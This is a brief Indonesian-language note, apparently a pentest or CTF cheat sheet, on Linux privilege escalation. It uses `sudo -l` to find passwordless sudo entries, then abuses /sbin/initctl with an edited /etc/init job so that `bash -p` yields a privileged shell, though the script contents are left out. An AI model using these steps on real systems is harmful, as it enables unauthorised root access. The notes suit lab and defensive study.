# SUDO

buat cek mana yang bisa sudo tanpa password pake ini:

    sudo -l 

contoh output:

    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

# /sbin/initctl

Privesc via /sbin/initctl

edit file `/etc/init/test.conf`
tambahin di dalem script
jalanin perintah: sudo /sbin/initctl start test
kalo dah jalan bakal begini: test start/running, process 11746

sekarang tinggal akses bash begini: bash -p
